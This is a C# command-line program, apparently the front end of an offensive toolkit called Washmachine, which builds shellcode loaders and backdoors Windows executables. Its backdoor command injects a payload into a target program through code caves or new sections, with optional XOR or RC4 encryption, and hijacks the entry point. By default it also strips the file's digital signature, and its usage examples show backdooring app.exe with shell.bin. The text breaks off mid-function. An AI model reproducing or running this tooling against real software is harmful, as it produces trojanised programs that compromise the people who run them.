using System.Globalization;
using System.Text.Json;
using Spectre.Console;
using Washmachine.Logging;
using Washmachine.Models;
using Washmachine.Services;
using Washmachine.Testing;

namespace Washmachine.Cli;

public static class Program
{
    private static readonly JsonSerializerOptions JsonPrint = new() { WriteIndented = false };

    public static async Task<int> Main(string[] args)
    {
        // One-shot mode: command provided on command line (e.g., from GUI or scripts)
        if (args.Length > 0)
        {
            return await DispatchAsync(args);
        }

        // Interactive REPL mode — Metasploit-style shell
        ShowBanner();
        return await RunReplAsync();
    }

    /// <summary>Dispatch a single command (one-shot or from REPL).</summary>
    private static async Task<int> DispatchAsync(string[] args)
    {
        bool jsonMode = args.Any(a => a == "--json");

        var command = args[0].ToLowerInvariant();
        var cmdArgs = args.Skip(1).ToArray();

        return command switch
        {
            "compile"   => await RunCompileAsync(cmdArgs),
            "analyze"   => await RunAnalyzeAsync(cmdArgs),
            "backdoor"  => await RunBackdoorAsync(cmdArgs),
            "strip"     => await RunStripAsync(cmdArgs),
            "list"      => await RunListAsync(cmdArgs),
            "provision" => await RunProvisionAsync(cmdArgs),
            "test"      => await TestHarness.RunAsync(cmdArgs),
            "help" or "--help" or "-h" => PrintUsage(),
            _ => PrintUnknownCommand(command),
        };
    }

    /// <summary>Interactive read-eval-print loop.</summary>
    private static async Task<int> RunReplAsync()
    {
        while (true)
        {
            AnsiConsole.WriteLine();
            string input;
            try
            {
                input = AnsiConsole.Prompt(
                    new TextPrompt<string>("[red]washmachine[/] [dim]>[/]")
                        .AllowEmpty());
            }
            catch (InvalidOperationException)
            {
                // Non-interactive terminal (piped input exhausted)
                break;
            }

            var line = input.Trim();
            if (string.IsNullOrEmpty(line))
                continue;

            switch (line.ToLowerInvariant())
            {
                case "exit" or "quit" or "q":
                    AnsiConsole.MarkupLine("[dim]Goodbye.[/]");
                    return 0;
                case "clear" or "cls":
                    AnsiConsole.Clear();
                    continue;
                case "banner":
                    ShowBanner();
                    continue;
            }

            // Tokenize input (respecting quoted strings)
            var tokens = TokenizeLine(line);
            if (tokens.Length == 0) continue;

            try
            {
                await DispatchAsync(tokens);
            }
            catch (Exception ex)
            {
                AnsiConsole.MarkupLine($"[red]Error:[/] {Markup.Escape(ex.Message)}");
            }
        }

        return 0;
    }

    /// <summary>Split a command line into tokens, respecting double-quoted strings.</summary>
    private static string[] TokenizeLine(string line)
    {
        var tokens = new List<string>();
        var current = new System.Text.StringBuilder();
        bool inQuote = false;

        foreach (char c in line)
        {
            if (c == '"')
            {
                inQuote = !inQuote;
            }
            else if (c == ' ' && !inQuote)
            {
                if (current.Length > 0)
                {
                    tokens.Add(current.ToString());
                    current.Clear();
                }
            }
            else
            {
                current.Append(c);
            }
        }

        if (current.Length > 0)
            tokens.Add(current.ToString());

        return tokens.ToArray();
    }

    // ═══════════════════════════════════════════════════════════════════════
    //  Banner
    // ═══════════════════════════════════════════════════════════════════════

    private static void ShowBanner()
    {
        // Figlet banner
        AnsiConsole.Write(new FigletText("WASHMACHINE").Color(Color.Red));

        // Typing effect for tagline
        var tagline = "Shellcode Loader Builder & PE Backdoor Toolkit";
        var dimStyle = new Style(Color.Grey, decoration: Decoration.Italic);
        foreach (char c in tagline)
        {
            AnsiConsole.Write(new Text(c.ToString(), dimStyle));
            Thread.Sleep(8);
        }
        AnsiConsole.WriteLine();
        AnsiConsole.WriteLine();

        // Info bar
        AnsiConsole.Write(new Rule().RuleStyle("grey"));
        var grid = new Grid()
            .AddColumn(new GridColumn().NoWrap())
            .AddColumn(new GridColumn().NoWrap())
            .AddColumn(new GridColumn().NoWrap())
            .AddColumn(new GridColumn().NoWrap())
            .AddColumn(new GridColumn().NoWrap());
        grid.AddRow(
            "[bold white]v1.0.0[/]",
            "[dim]|[/]",
            "[bold cyan link=https://github.com/0xhmza]github.com/0xhmza[/]",
            "[dim]|[/]",
            "[yellow]For educational & authorized testing only[/]"
        );
        AnsiConsole.Write(grid);
        AnsiConsole.Write(new Rule().RuleStyle("grey"));
        AnsiConsole.WriteLine();
    }

    // ═══════════════════════════════════════════════════════════════════════
    //  compile
    // ═══════════════════════════════════════════════════════════════════════

    private static async Task<int> RunCompileAsync(string[] args)
    {
        string? shellcodeFile = null;
        string? shellcodeHex = null;
        string? shellcodeUrl = null;
        string? templateId = null;
        string? encoderIndex = null;
        string? envelopeIndex = null;
        var snippets = new Dictionary<string, string>();
        bool verbose = false;
        bool jsonOutput = false;

        for (int i = 0; i < args.Length; i++)
        {
            switch (args[i])
            {
                case "--shellcode" or "-s" when i + 1 < args.Length:
                    shellcodeFile = args[++i]; break;
                case "--shellcode-hex" when i + 1 < args.Length:
                    shellcodeHex = args[++i]; break;
                case "--shellcode-url" or "-u" when i + 1 < args.Length:
                    shellcodeUrl = args[++i]; break;
                case "--template" or "-t" when i + 1 < args.Length:
                    templateId = args[++i]; break;
                case "--encoder" or "-e" when i + 1 < args.Length:
                    encoderIndex = args[++i]; break;
                case "--envelope" or "-v" when i + 1 < args.Length:
                    envelopeIndex = args[++i]; break;
                case "--snippet" when i + 1 < args.Length:
                    var kv = args[++i].Split('=', 2);
                    if (kv.Length == 2) snippets[kv[0]] = kv[1];
                    break;
                case "--verbose": verbose = true; break;
                case "--json": jsonOutput = true; break;
                default:
                    Console.Error.WriteLine($"Unknown option: {args[i]}");
                    return 1;
            }
        }

        if (shellcodeFile == null && shellcodeHex == null && shellcodeUrl == null)
        {
            Console.Error.WriteLine("Error: provide --shellcode <file>, --shellcode-hex <hex>, or --shellcode-url <url>");
            return 1;
        }

        var logger = new ConsoleLogger();
        if (verbose) logger.VerboseEnabled = true;

        var paths = new AppPaths();

        // Ensure requirements (Bin2Shell) before compilation
        var provisioner = new RequirementProvisioner(paths, logger);
        await provisioner.EnsureRequirementsAsync(new ConsoleProgressReporter());

        var runner = new Bin2ShellRunner(paths);
        var snippetService = new YamlCodeSnippetCatalogService(paths);
        var toolLocator = new CompilerToolLocator(logger);
        var compiler = new CompilerService(paths, runner, snippetService, toolLocator, logger);

        // Build UiData from CLI arguments
        var textBoxes = new Dictionary<string, string>
        {
            ["shellcodeFile"] = shellcodeFile ?? "",
            ["shellcodeRAW"] = shellcodeHex ?? "",
            ["shellcodeURL"] = shellcodeUrl ?? "",
            ["shellcodeURLFile"] = "",
        };

        var comboBoxes = new Dictionary<string, string>
        {
            ["templateComboBox"] = templateId ?? "shellcode-minimal",
        };

        // Resolve encoder/envelope display text from catalog
        var encodingCatalog = new ShellcodeEncodingCatalogService(runner, paths);
        try
        {
            var catalog = await encodingCatalog.GetCatalogAsync();

            if (encoderIndex != null && int.TryParse(encoderIndex, out int encIdx))
            {
                var enc = catalog.Encoders.FirstOrDefault(e => e.Index == encIdx);
                comboBoxes["bin2hexEncoder"] = enc?.DisplayText ?? $"{encIdx} - custom";
            }
            else
            {
                comboBoxes["bin2hexEncoder"] = "0 - none";
            }

            if (envelopeIndex != null && int.TryParse(envelopeIndex, out int envIdx))
            {
                var env = catalog.Envelopes.FirstOrDefault(e => e.Index == envIdx);
                comboBoxes["bin2hexEnvelope"] = env?.DisplayText ?? $"{envIdx} - custom";
            }
            else
            {
                comboBoxes["bin2hexEnvelope"] = "0 - none";
            }
        }
        catch (Exception ex)
        {
            logger.Warn($"Could not load encoding catalog: {ex.Message}");
            comboBoxes["bin2hexEncoder"] = encoderIndex != null ? $"{encoderIndex} - custom" : "0 - none";
            comboBoxes["bin2hexEnvelope"] = envelopeIndex != null ? $"{envelopeIndex} - custom" : "0 - none";
        }

        // Apply snippet selections and defaults
        foreach (var kv in snippets)
            comboBoxes[$"snippetCombo_{kv.Key}_0"] = kv.Value;

        // Apply default snippets for the selected template
        if (snippetService.TryGetTemplate(comboBoxes["templateComboBox"], out var tmpl))
        {
            foreach (var ph in tmpl.Placeholders.Where(p => p.Kind == TemplatePlaceholderKind.Snippet))
            {
                if (!snippetService.TryResolveSection(ph.SnippetTemplateKey, out var section))
                    continue;
                string comboName = $"snippetCombo_{ph.SnippetTemplateKey}_0";
                if (!comboBoxes.ContainsKey(comboName))
                {
                    var defaultItem = section.Items.FirstOrDefault(si => si.IsDefault)
                                      ?? section.Items.FirstOrDefault();
                    if (defaultItem != null)
                        comboBoxes[comboName] = defaultItem.Id;
                }
            }

            // Apply default input values
            foreach (var section in snippetService.GetAllSections())
            {
                foreach (var input in section.Inputs)
                {
                    if (!string.IsNullOrWhiteSpace(input.DefaultValue) && !textBoxes.ContainsKey(input.Id))
                        textBoxes[input.Id] = input.DefaultValue;
                }
            }
        }

        var data = new UiData(textBoxes, comboBoxes);

        try
        {
            var result = jsonOutput
                ? await compiler.CompileAsync(data)
                : await AnsiConsole.Status()
                    .Spinner(Spinner.Known.Dots)
                    .SpinnerStyle(Style.Parse("cyan"))
                    .StartAsync("Compiling...", async _ => await compiler.CompileAsync(data));

            if (jsonOutput)
            {
                var output = new
                {
                    result.Success,
                    result.OutputExePath,
                    result.GeneratedSourcePath,
                    Notes = result.Notes,
                    CompilerPath = result.Discovery?.Best?.Path,
                    ConversionSuccess = result.ConversionResult.Success,
                    ConversionError = result.ConversionResult.Error,
                };
                Console.WriteLine(JsonSerializer.Serialize(output, JsonPrint));
            }
            else
            {
                foreach (var note in result.Notes)
                    logger.Info(note);

                if (result.Success)
                {
                    AnsiConsole.Write(new Panel("[green]Compilation succeeded.[/]")
                        .BorderColor(Color.Green)
                        .Border(BoxBorder.Rounded));
                }
                else
                {
                    AnsiConsole.Write(new Panel($"[red]Compilation failed: {Markup.Escape(result.ConversionResult.Error ?? "unknown")}[/]")
                        .BorderColor(Color.Red)
                        .Border(BoxBorder.Rounded));
                }
            }

            return result.Success ? 0 : 1;
        }
        catch (Exception ex)
        {
            logger.Error($"Fatal: {ex.Message}");
            return 1;
        }
    }

    // ═══════════════════════════════════════════════════════════════════════
    //  analyze
    // ═══════════════════════════════════════════════════════════════════════

    private static async Task<int> RunAnalyzeAsync(string[] args)
    {
        if (args.Length == 0)
        {
            Console.Error.WriteLine("Usage: washmachine-cli analyze <pe-file>");
            return 1;
        }

        var peFile = args[0];
        if (!File.Exists(peFile))
        {
            Console.Error.WriteLine($"File not found: {peFile}");
            return 1;
        }

        bool jsonOutput = args.Contains("--json");
        var logger = new ConsoleLogger();
        var analyzer = new PeAnalyzerService(logger);

        try
        {
            var result = await analyzer.AnalyzeAsync(peFile);

            if (jsonOutput)
            {
                Console.WriteLine(JsonSerializer.Serialize(result, JsonPrint));
            }
            else
            {
                AnsiConsole.Write(new Panel($"[bold cyan]PE Analysis[/]  [grey]{Markup.Escape(peFile)}[/]")
                    .BorderColor(Color.Cyan1)
                    .Border(BoxBorder.Rounded));
                AnsiConsole.WriteLine();

                AnsiConsole.MarkupLine($"  [cyan]Architecture:[/]  [white]{Markup.Escape(result.Architecture)}[/]");
                AnsiConsole.MarkupLine($"  [cyan]Sections:[/]      [white]{result.TotalSections}[/]");
                AnsiConsole.MarkupLine($"  [cyan]Imports:[/]       [white]{result.TotalImports} DLLs[/]");
                AnsiConsole.WriteLine();

                var sectionTable = new Table()
                    .Border(TableBorder.Rounded)
                    .BorderColor(Color.Grey)
                    .AddColumn(new TableColumn("[cyan]Section[/]").LeftAligned())
                    .AddColumn(new TableColumn("[cyan]VirtAddr[/]").RightAligned())
                    .AddColumn(new TableColumn("[cyan]VirtSize[/]").RightAligned())
                    .AddColumn(new TableColumn("[cyan]RawSize[/]").RightAligned())
                    .AddColumn(new TableColumn("[cyan]Perms[/]").Centered())
                    .AddColumn(new TableColumn("[cyan]Entropy[/]").RightAligned());

                foreach (var sec in result.Sections)
                {
                    string entropyColor = sec.Entropy < 6.0 ? "green" : sec.Entropy < 7.0 ? "yellow" : "red";
                    sectionTable.AddRow(
                        Markup.Escape(sec.Name),
                        $"[magenta1]0x{sec.VirtualAddress:X6}[/]",
                        $"[magenta1]0x{sec.VirtualSize:X6}[/]",
                        $"[magenta1]0x{sec.RawSize:X6}[/]",
                        Markup.Escape(sec.PermissionsString),
                        $"[{entropyColor}]{sec.Entropy:F2}[/]"
                    );
                }

                AnsiConsole.Write(sectionTable);

                if (result.TotalCodeCaves > 0)
                {
                    AnsiConsole.WriteLine();
                    AnsiConsole.MarkupLine($"  [cyan]Code caves found:[/]  [white]{result.TotalCodeCaves}[/]");

                    var caveTable = new Table()
                        .Border(TableBorder.Rounded)
                        .BorderColor(Color.Grey)
                        .AddColumn("[cyan]Section[/]")
                        .AddColumn("[cyan]Offset[/]")
                        .AddColumn("[cyan]Size[/]");

                    foreach (var cave in result.CodeCaves)
                    {
                        caveTable.AddRow(
                            Markup.Escape(cave.SectionName),
                            $"[magenta1]0x{cave.FileOffset:X}[/]",
                            $"[white]{cave.Size}[/]"
                        );
                    }

                    AnsiConsole.Write(caveTable);
                }
            }

            return 0;
        }
        catch (Exception ex)
        {
            logger.Error($"Analysis failed: {ex.Message}");
            return 1;
        }
    }

    // ═══════════════════════════════════════════════════════════════════════
    //  backdoor
    // ═══════════════════════════════════════════════════════════════════════

    private static async Task<int> RunBackdoorAsync(string[] args)
    {
        string? peFile = null;
        string? shellcodeFile = null;
        string? outputFile = null;
        string method = "code-cave";
        string encryption = "none";
        byte xorKey = 0x42;
        string sectionName = ".extra";
        bool removeSig = true;
        bool patchSubsystem = true;
        bool dryRun = false;
        bool verbose = false;
        bool jsonOutput = false;
        int minCaveSize = 0;

        for (int i = 0; i < args.Length; i++)
        {
            switch (args[i])
            {
                case "--pe" when i + 1 < args.Length:
                    peFile = args[++i]; break;
                case "--shellcode" or "-s" when i + 1 < args.Length:
                    shellcodeFile = args[++i]; break;
                case "--output" or "-o" when i + 1 < args.Length:
                    outputFile = args[++i]; break;
                case "--method" or "-m" when i + 1 < args.Length:
                    method = args[++i].ToLowerInvariant(); break;
                case "--encryption" or "--enc" when i + 1 < args.Length:
                    encryption = args[++i].ToLowerInvariant(); break;
                case "--xor-key" when i + 1 < args.Length:
                    var keyStr = args[++i];
                    xorKey = keyStr.StartsWith("0x", StringComparison.OrdinalIgnoreCase)
                        ? Convert.ToByte(keyStr, 16)
                        : byte.Parse(keyStr);
                    break;
                case "--section-name" when i + 1 < args.Length:
                    sectionName = args[++i]; break;
                case "--no-remove-sig":
                    removeSig = false; break;
                case "--no-patch-subsystem":
                    patchSubsystem = false; break;
                case "--cave-min-size" when i + 1 < args.Length:
                    minCaveSize = int.Parse(args[++i]); break;
                case "--dry-run":
                    dryRun = true; break;
                case "--verbose":
                    verbose = true; break;
                case "--json":
                    jsonOutput = true; break;
                default:
                    if (args[i].StartsWith("-"))
                    {
                        Console.Error.WriteLine($"Unknown option: {args[i]}");
                        PrintBackdoorUsage();
                        return 1;
                    }
                    break;
            }
        }

        if (peFile == null || shellcodeFile == null)
        {
            PrintBackdoorUsage();
            return 1;
        }

        if (!File.Exists(peFile))
        {
            Console.Error.WriteLine($"Target PE not found: {peFile}");
            return 1;
        }
        if (!File.Exists(shellcodeFile))
        {
            Console.Error.WriteLine($"Shellcode file not found: {shellcodeFile}");
            return 1;
        }

        var injectionMethod = method switch
        {
            "code-cave" or "codecave" or "cave" => InjectionMethod.CodeCave,
            "new-section" or "newsection" or "section" => InjectionMethod.NewSection,
            "section-ext" or "sectionext" or "extend" => InjectionMethod.SectionExtension,
            _ => InjectionMethod.CodeCave
        };

        var encryptionMethod = encryption switch
        {
            "xor" => PayloadEncryption.Xor,
            "xor2" => PayloadEncryption.Xor2,
            "rc4" => PayloadEncryption.Rc4,
            _ => PayloadEncryption.None
        };

        var logger = new ConsoleLogger();
        if (verbose) logger.VerboseEnabled = true;
        if (jsonOutput) logger.SuppressOutput = true;
        var paths = new AppPaths();
        var service = new PeBackdoorService(paths, logger);
        var analyzerService = new PeAnalyzerService(logger);

        try
        {
            // ── Banner ───────────────────────────────────────────────
            if (!jsonOutput)
            {
                AnsiConsole.WriteLine();
                AnsiConsole.Write(new Panel("[bold red]Washmachine PE Backdoor[/]")
                    .Border(BoxBorder.Double)
                    .BorderColor(Color.Red));
                AnsiConsole.WriteLine();
            }

            // ── PE Analysis ──────────────────────────────────────────
            var peInfo = await service.AnalyzePeAsync(peFile);
            var analysisResult = await analyzerService.AnalyzeAsync(peFile);
            var shellcodeBytes = await File.ReadAllBytesAsync(shellcodeFile);

            if (!jsonOutput)
            {
                AnsiConsole.Write(new Rule("[bold cyan]Target PE Analysis[/]").RuleStyle(Style.Parse("grey")).LeftJustified());
                AnsiConsole.WriteLine();

                var peTable = new Table()
                    .Border(TableBorder.Rounded)
                    .BorderColor(Color.Grey)
                    .HideHeaders()
                    .AddColumn("Property")
                    .AddColumn("Value");

                peTable.AddRow("[cyan]File[/]", $"[white]{Markup.Escape(Path.GetFileName(peFile))}[/]");
                peTable.AddRow("[cyan]Size[/]", $"[white]{new FileInfo(peFile).Length:N0} bytes ({new FileInfo(peFile).Length / 1024.0 / 1024.0:F1} MB)[/]");
                peTable.AddRow("[cyan]Arch[/]", $"[white]{(peInfo.Is64Bit ? "x64 (PE32+)" : "x86 (PE32)")}[/]");
                peTable.AddRow("[cyan]Type[/]", $"[white]{(peInfo.IsDll ? "DLL" : "GUI Executable")}[/]");
                peTable.AddRow("[cyan]Entry[/]", $"[magenta1]0x{peInfo.EntryPoint:X}[/]");
                peTable.AddRow("[cyan]ImageBase[/]", $"[magenta1]0x{peInfo.ImageBase:X}[/]");
                peTable.AddRow("[cyan]Signature[/]", $"[white]{(peInfo.HasSignature ? "Present (will be removed)" : "None")}[/]");
                peTable.AddRow("[cyan].NET[/]", $"[white]{(analysisResult.IsDotNet ? "Yes" : "No")}[/]");
                peTable.AddRow("[cyan]ASLR[/]", $"[white]{(peInfo.HasAslr ? "Yes" : "No")}[/]");
                peTable.AddRow("[cyan]Sections[/]", $"[white]{peInfo.Sections.Count}[/]");

                AnsiConsole.Write(peTable);
                AnsiConsole.WriteLine();

                var sectionTable = new Table()
                    .Border(TableBorder.Rounded)
                    .BorderColor(Color.Grey)
                    .AddColumn(new TableColumn("[cyan]Section[/]").LeftAligned())
                    .AddColumn(new TableColumn("[cyan]VirtAddr[/]").RightAligned())
                    .AddColumn(new TableColumn("[cyan]VirtSize[/]").RightAligned())
                    .AddColumn(new TableColumn("[cyan]RawSize[/]").RightAligned())
                    .AddColumn(new TableColumn("[cyan]Perms[/]").Centered())
                    .AddColumn(new TableColumn("[cyan]Entropy[/]").RightAligned());

                foreach (var sec in analysisResult.Sections)
                {
                    string entropyColor = sec.Entropy < 6.0 ? "green" : sec.Entropy < 7.0 ? "yellow" : "red";
                    sectionTable.AddRow(
                        Markup.Escape(sec.Name),
                        $"[magenta1]0x{sec.VirtualAddress:X6}[/]",
                        $"[magenta1]0x{sec.VirtualSize:X6}[/]",
                        $"[magenta1]0x{sec.RawSize:X6}[/]",
                        Markup.Escape(sec.PermissionsString),
                        $"[{entropyColor}]{sec.Entropy:F2}[/]"
                    );
                }

                AnsiConsole.Write(sectionTable);

                // Code caves
                AnsiConsole.WriteLine();
                var caves = await service.FindCodeCavesAsync(peFile, Math.Max(minCaveSize, 50));
                AnsiConsole.Write(new Rule("[bold cyan]Code Caves[/]").RuleStyle(Style.Parse("grey")).LeftJustified());
                AnsiConsole.MarkupLine($"  [cyan]Found:[/] [white]{caves.Count}[/]");

                if (caves.Count > 0)
                {
                    var caveTable = new Table()
                        .Border(TableBorder.Rounded)
                        .BorderColor(Color.Grey)
                        .AddColumn("[cyan]Section[/]")
                        .AddColumn("[cyan]Offset[/]")
                        .AddColumn("[cyan]RVA[/]")
                        .AddColumn("[cyan]Size[/]");

                    foreach (var cave in caves.Take(10))
                    {
                        caveTable.AddRow(
                            Markup.Escape(cave.SectionName),
                            $"[magenta1]0x{cave.FileOffset:X6}[/]",
                            $"[magenta1]0x{cave.VirtualAddress:X6}[/]",
                            $"[white]{cave.Size,6} bytes[/]"
                        );
                    }

                    AnsiConsole.Write(caveTable);

                    if (caves.Count > 10)
                        AnsiConsole.MarkupLine($"  [grey]... and {caves.Count - 10} more[/]");
                    AnsiConsole.MarkupLine($"  [cyan]Largest:[/] [white]{Markup.Escape(caves[0].SectionName)} ({caves[0].Size:N0} bytes)[/]");
                }

                // Shellcode info
                AnsiConsole.WriteLine();
                AnsiConsole.Write(new Rule("[bold cyan]Shellcode[/]").RuleStyle(Style.Parse("grey")).LeftJustified());

                var scTable = new Table()
                    .Border(TableBorder.Rounded)
                    .BorderColor(Color.Grey)
                    .HideHeaders()
                    .AddColumn("Property")
                    .AddColumn("Value");

                scTable.AddRow("[cyan]File[/]", $"[white]{Markup.Escape(Path.GetFileName(shellcodeFile))}[/]");
                scTable.AddRow("[cyan]Size[/]", $"[white]{shellcodeBytes.Length} bytes[/]");
                scTable.AddRow("[cyan]First bytes[/]", $"[magenta1]{BitConverter.ToString(shellcodeBytes.Take(Math.Min(16, shellcodeBytes.Length)).ToArray()).Replace("-", " ")}[/]");

                AnsiConsole.Write(scTable);

                // Pre-flight checks
                AnsiConsole.WriteLine();
                AnsiConsole.Write(new Rule("[bold cyan]Pre-flight Checks[/]").RuleStyle(Style.Parse("grey")).LeftJustified());
                PrintCheck(!analysisResult.IsDotNet, "Not a .NET assembly");
                PrintCheck(!analysisResult.IsPossiblyPacked, $"Not packed (entropy: {analysisResult.OverallEntropy:F2})");
                PrintCheck(peInfo.EntryPoint != 0, $"Entry point is valid (0x{peInfo.EntryPoint:X})");

                if (injectionMethod == InjectionMethod.CodeCave)
                {
                    int stubOverhead = peInfo.Is64Bit ? 66 : 14;
                    int needed = shellcodeBytes.Length + stubOverhead;
                    bool hasCave = caves.Any(c => c.Size >= needed);
                    PrintCheck(hasCave, $"Sufficient code cave space ({(hasCave ? $"{caves[0].Size:N0}" : "0")} >= {needed} bytes needed)");
                }

                PrintCheck(!peInfo.HasSignature || removeSig, peInfo.HasSignature
                    ? "PE has digital signature (will be removed)"
                    : "No digital signature");

                // Injection plan
                AnsiConsole.WriteLine();
                AnsiConsole.Write(new Rule("[bold cyan]Injection Plan[/]").RuleStyle(Style.Parse("grey")).LeftJustified());

                var planTable = new Table()
                    .Border(TableBorder.Rounded)
                    .BorderColor(Color.Grey)
                    .HideHeaders()
                    .AddColumn("Property")
                    .AddColumn("Value");

                planTable.AddRow("[cyan]Method[/]", $"[white]{injectionMethod}[/]");
                planTable.AddRow("[cyan]Encryption[/]", $"[white]{encryptionMethod}{(encryptionMethod == PayloadEncryption.Xor ? $" (key=0x{xorKey:X2})" : "")}[/]");
                planTable.AddRow("[cyan]Invoke[/]", "[white]Entry Point Hijack[/]");
                planTable.AddRow("[cyan]Remove sig[/]", $"[white]{removeSig}[/]");
                planTable.AddRow("[cyan]Patch GUI[/]", $"[white]{patchSubsystem}[/]");

                AnsiConsole.Write(planTable);
                AnsiConsole.WriteLine();
            }

            if (dryRun)
            {
                if (!jsonOutput)
                {
                    AnsiConsole.Write(new Panel("[green]Dry run \u2014 no injection performed.[/]")
                        .BorderColor(Color.Green)
                        .Border(BoxBorder.Rounded));
                }
                return 0;
            }

            // ── Inject ───────────────────────────────────────────────
            var options = new PeBackdoorOptions
            {
                TargetPePath = peFile,
                ShellcodePath = shellcodeFile,
                OutputPath = outputFile ?? Path.Combine(
                    Path.GetDirectoryName(peFile) ?? ".",
                    Path.GetFileNameWithoutExtension(peFile) + ".backdoored" + Path.GetExtension(peFile)),
                Method = injectionMethod,
                Encryption = encryptionMethod,
                XorKey = xorKey,
                NewSectionName = sectionName,
                RemoveSignature = removeSig,
                PatchSubsystemToGui = patchSubsystem,
                MinCaveSize = minCaveSize,
            };

            var result = jsonOutput
                ? await service.BackdoorAsync(options)
                : await AnsiConsole.Status()
                    .Spinner(Spinner.Known.Dots)
                    .SpinnerStyle(Style.Parse("red"))
                    .StartAsync("Injecting payload...", async _ => await service.BackdoorAsync(options));

            if (jsonOutput)
            {
                var output = new
                {
                    result.Success,
                    result.OutputPath,
                    result.ErrorMessage,
                    result.ShellcodeAddress,
                    result.CarrierAddress,
                    result.ShellcodeSize,
                    result.CarrierSize,
                    result.Warnings,
                    result.Steps,
                };
                Console.WriteLine(System.Text.Json.JsonSerializer.Serialize(output, JsonPrint));
            }
            else
            {
                foreach (var step in result.Steps)
                    AnsiConsole.MarkupLine($"    [green]\u2713[/] {Markup.Escape(step)}");

                foreach (var warn in result.Warnings)
                    AnsiConsole.MarkupLine($"    [yellow]\u26A0[/] {Markup.Escape(warn)}");

                AnsiConsole.WriteLine();
                if (result.Success)
                {
                    AnsiConsole.Write(new Panel(
                        $"[green]SUCCESS: Backdoored PE written to {Markup.Escape(result.OutputPath ?? "unknown")}[/]\n" +
                        $"[grey]Output size: {new FileInfo(result.OutputPath!).Length:N0} bytes[/]")
                        .BorderColor(Color.Green)
                        .Border(BoxBorder.Rounded));
                }
                else
                {
                    AnsiConsole.Write(new Panel($"[red]FAILED: {Markup.Escape(result.ErrorMessage ?? "unknown")}[/]")
                        .BorderColor(Color.Red)
                        .Border(BoxBorder.Rounded));
                    return 1;
                }
            }

            return result.Success ? 0 : 1;
        }
        catch (Exception ex)
        {
            if (jsonOutput)
            {
                Console.WriteLine(System.Text.Json.JsonSerializer.Serialize(new { Success = false, Error = ex.Message }, JsonPrint));
            }
            else
            {
                logger.Error($"Backdoor failed: {ex.Message}");
                if (verbose) logger.Error(ex.StackTrace ?? "");
            }
            return 1;
        }
    }

    private static void PrintCheck(bool ok, string message)
    {
        var icon = ok ? "[green]\u2713[/]" : "[red]\u2717[/]";
        AnsiConsole.MarkupLine($"    {icon} {Markup.Escape(message)}");
    }

    private static void PrintBackdoorUsage()
    {
        AnsiConsole.WriteLine();
        AnsiConsole.MarkupLine("[dim]Usage:[/] washmachine-cli backdoor [yellow]--pe <file>[/] [yellow]--shellcode <file>[/] [grey][[options]][/]");
        AnsiConsole.WriteLine();

        AnsiConsole.Write(new Rule("[cyan]Required[/]").RuleStyle(Style.Parse("grey")).LeftJustified());

        var reqTable = new Table()
            .Border(TableBorder.None)
            .HideHeaders()
            .AddColumn("Option")
            .AddColumn("Description");

        reqTable.AddRow("[yellow]--pe <file>[/]", "Target PE file to backdoor");
        reqTable.AddRow("[yellow]--shellcode, -s <file>[/]", "Shellcode .bin file to inject");

        AnsiConsole.Write(reqTable);
        AnsiConsole.WriteLine();

        AnsiConsole.Write(new Rule("[cyan]Options[/]").RuleStyle(Style.Parse("grey")).LeftJustified());

        var optTable = new Table()
            .Border(TableBorder.None)
            .HideHeaders()
            .AddColumn("Option")
            .AddColumn("Description");

        optTable.AddRow("[yellow]--output, -o <file>[/]", "Output file (default: <input>.backdoored.exe)");
        optTable.AddRow("[yellow]--method, -m <method>[/]", "code-cave | new-section | section-ext");
        optTable.AddRow("[yellow]--encryption <enc>[/]", "none | xor | xor2 | rc4");
        optTable.AddRow("[yellow]--xor-key <byte>[/]", "XOR key as hex (e.g., 0x42) or decimal");
        optTable.AddRow("[yellow]--section-name <name>[/]", "Name for new section (default: .extra)");
        optTable.AddRow("[yellow]--no-remove-sig[/]", "Don't remove PE digital signature");
        optTable.AddRow("[yellow]--no-patch-subsystem[/]", "Don't patch subsystem to GUI");
        optTable.AddRow("[yellow]--cave-min-size <n>[/]", "Minimum code cave size in bytes");
        optTable.AddRow("[yellow]--dry-run[/]", "Analyze and report without injecting");
        optTable.AddRow("[yellow]--verbose[/]", "Show detailed logging");
        optTable.AddRow("[yellow]--json[/]", "Output results as JSON");

        AnsiConsole.Write(optTable);
        AnsiConsole.WriteLine();

        AnsiConsole.Write(new Rule("[cyan]Examples[/]").RuleStyle(Style.Parse("grey")).LeftJustified());
        AnsiConsole.MarkupLine("  [grey]washmachine-cli backdoor --pe app.exe -s calc.bin[/]");
        AnsiConsole.MarkupLine("  [grey]washmachine-cli backdoor --pe app.exe -s payload.bin -m new-section[/]");
        AnsiConsole.MarkupLine("  [grey]washmachine-cli backdoor --pe app.exe -s shell.bin --enc xor --xor-key 0x42[/]");
        AnsiConsole.MarkupLine("  [grey]washmachine-cli backdoor --pe app.exe -s shell.bin --dry-run --verbose[/]");
    }

    // ═══════════════════════════════════════════════════════════════════════
    //  strip
    // ═══════════════════════════════════════════════════════════════════════

    private static async Task<int> RunStripAsync(string[] args)
    {
        if (args.Length == 0 || args[0] is "--help" or "-h")
        {
            PrintStripUsage();
            return args.Length == 0 ? 1 : 0;
        }

        string peFile = args[0];
        string? outputFile = null;
        string? sectionName = null;
        bool analyze = false;
        bool noTrim = false;
        var mode = StripMode.EntryPointToEnd;
        uint rangeStart = 0, rangeLen = 0;

        for (int i = 1; i < args.Length; i++)
        {
            switch (args[i])
            {
                case "-o" or "--output":
                    if (++i < args.Length) outputFile = args[i];
                    break;
                case "--mode" or "-m":
                    if (++i < args.Length)
                    {
                        mode = args[i].ToLowerInvariant() switch
                        {
                            "ep" or "entry-point" => StripMode.EntryPointToEnd,
                            "section"             => StripMode.Section,
                            "all-exec"            => StripMode.AllExecutable,
                            "range"               => StripMode.RawRange,
                            _ => mode,
                        };
                    }
                    break;
                case "--section":
                    if (++i < args.Length) sectionName = args[i];
                    break;
                case "--analyze":
                    analyze = true;
                    break;
                case "--no-trim":
                    noTrim = true;
                    break;
                case "--range":
                    if (++i < args.Length)
                    {
                        var parts = args[i].Split(':');
                        if (parts.Length == 2)
                        {
                            rangeStart = Convert.ToUInt32(parts[0], parts[0].StartsWith("0x", StringComparison.OrdinalIgnoreCase) ? 16 : 10);
                            rangeLen = Convert.ToUInt32(parts[1], parts[1].StartsWith("0x", StringComparison.OrdinalIgnoreCase) ? 16 : 10);
                        }
                    }
                    break;
            }
        }

        if (!File.Exists(peFile))
        {
            AnsiConsole.MarkupLine($"[red]File not found:[/] [white]{Markup.Escape(peFile)}[/]");
            return 1;
        }

        var logger = new ConsoleLogger();
        var stripper = new PeStripService(logger);

        if (analyze)
